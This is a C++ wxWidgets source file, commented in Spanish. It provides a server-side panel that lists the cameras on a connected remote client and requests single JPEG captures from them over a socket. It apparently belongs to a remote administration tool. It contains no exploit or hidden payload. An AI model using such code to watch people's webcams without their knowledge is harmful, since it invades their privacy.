#include "panel_camara.hpp"
#include "frame_client.hpp"
#include "misc.hpp"
#include "server.hpp"

extern Servidor* p_Servidor;

wxBEGIN_EVENT_TABLE(panelCamara, wxPanel)
	EVT_BUTTON(EnumCamMenu::ID_Refrescar_Lista, panelCamara::OnRefrescarLista)
	EVT_BUTTON(EnumCamMenu::ID_Spawn_Frame, panelCamara::OnManageCam)
wxEND_EVENT_TABLE()

wxBEGIN_EVENT_TABLE(panelPictureBox, wxPanel)
	EVT_CLOSE(panelPictureBox::OnClose)
	EVT_MENU(EnumCamMenu::ID_SingleShot, panelPictureBox::OnSingleShot)
	EVT_MENU(EnumCamMenu::ID_StartLive, panelPictureBox::OnLive)
wxEND_EVENT_TABLE()

panelPictureBox::panelPictureBox(wxWindow* pParent, wxString strTitle, int iCamIndex, wxString strName) :
	wxFrame(pParent, EnumCamMenu::ID_Picture_Frame, strTitle + " - Index " + std::to_string(iCamIndex), wxDefaultPosition, wxDefaultSize, wxDD_DEFAULT_STYLE, strName) {
	
	this->imageCtrl = new wxStaticBitmap(this, wxID_ANY, wxBitmap(600, 300));

	wxMenuBar* menuBar = new wxMenuBar();
	
	wxMenu* camMenu = new wxMenu();

	camMenu->Append(EnumCamMenu::ID_SingleShot, "Captura unica");
	camMenu->Append(EnumCamMenu::ID_StartLive, "Live");

	menuBar->Append(camMenu, "Camara");

	wxBoxSizer* sizer = new wxBoxSizer(wxVERTICAL);
	sizer->Add(this->imageCtrl, 1, wxEXPAND | wxALL, 5);
	this->SetSizer(sizer);
	this->Layout();

	this->SetMenuBar(menuBar);
}

void panelPictureBox::OnDrawBuffer() {
	if (this->cPictureBuffer) {
		wxMemoryInputStream imgStream(this->cPictureBuffer, this->iBufferSize);
		wxImage::AddHandler(new wxJPEGHandler);

		wxImage img(imgStream, wxBITMAP_TYPE_JPEG);

		if (img.IsOk()) {
			wxBitmap bmp_Obj(img);
			
			if (this->imageCtrl) {
				this->imageCtrl->SetBitmap(bmp_Obj);
				this->GetSizer()->Layout();
				this->GetSizer()->Fit(this);
				this->Refresh();
				this->Update();
			} else {
				error();
				std::cout << "[X] imageCtrl no esta inicializado\n";
			}
			//if (this->imageCtrl) {
			//	this->GetSizer()->Detach(imageCtrl);
			//	this->imageCtrl->Destroy();
			//	this->imageCtrl = nullptr;
			//}

			//this->imageCtrl = new wxStaticBitmap(this, wxID_ANY, bmp_Obj, wxPoint(0,0), wxSize(img.GetWidth(), img.GetHeight()));
			/*this->GetSizer()->Add(this->imageCtrl, 1, wxEXPAND | wxALL, 5);
			this->GetSizer()->Layout();
			this->GetSizer()->Fit(this);
			this->Refresh();
			this->Update();*/
		}
	}
}



void panelPictureBox::OnClose(wxCloseEvent& event) {
	Destroy();
}

void panelPictureBox::OnSingleShot(wxCommandEvent& event) {
	//Enviar comando para obtener captura sencilla
	std::vector<std::string> vcTmp = strSplit(this->GetTitle().ToStdString(), ' ', 10);
	std::string strComando = std::to_string(EnumComandos::CM_Single);
	strComando.append(1, CMD_DEL);
	strComando += vcTmp[vcTmp.size() - 1];

	p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
}

void panelPictureBox::OnLive(wxCommandEvent& event) {
	return;
}

panelCamara::panelCamara(wxWindow* pParent):
	wxPanel(pParent, wxID_ANY){

	wxWindow* wxTree = (MyTreeCtrl*)this->GetParent();
	if (wxTree) {
		wxPanel* panel_cliente = (wxPanel*)wxTree->GetParent();
		if (panel_cliente) {
			FrameCliente* frame_cliente = (FrameCliente*)panel_cliente->GetParent();
			if (frame_cliente) {
				this->sckCliente = frame_cliente->sckCliente;
				this->strID = frame_cliente->strClienteID;
			}
		}
	}

	this->cam_Devices = new wxComboBox(this, EnumCamMenu::ID_Combo_Devices, "...", wxDefaultPosition, wxSize(200, 20));
	wxButton* btn_Listar = new wxButton(this, EnumCamMenu::ID_Refrescar_Lista, "Refrescar lista");
	wxButton* btn_ManageCam = new wxButton(this, EnumCamMenu::ID_Spawn_Frame, "Administrar");
	
	wxBoxSizer* nSizer = new wxBoxSizer(wxHORIZONTAL);
	nSizer->Add(this->cam_Devices, 0, wxALL, 1);
	nSizer->AddSpacer(20);
	nSizer->Add(btn_Listar, 0, wxALL, 1);
	nSizer->Add(btn_ManageCam, 0, wxALL, 1);
	
	this->SetSizerAndFit(nSizer);
}

void panelCamara::OnRefrescarLista(wxCommandEvent& event) {
	//Enviar comando para obtener lista
	std::string strComando = std::to_string(EnumComandos::CM_Lista);
	strComando.append(1, CMD_DEL);
	strComando.append(1, '1');
	p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
}

void panelCamara::OnManageCam(wxCommandEvent& event) {
	//Abrir nueva frame para administrar la camara seleccionada en el combo box
	if (this->cam_Devices->GetStringSelection() != "") {
		this->pictureBox = new panelPictureBox(this, this->cam_Devices->GetStringSelection(), this->cam_Devices->GetSelection(), this->strID);
		this->pictureBox->sckCliente = this->sckCliente;
		this->pictureBox->Show(true);
	}

}
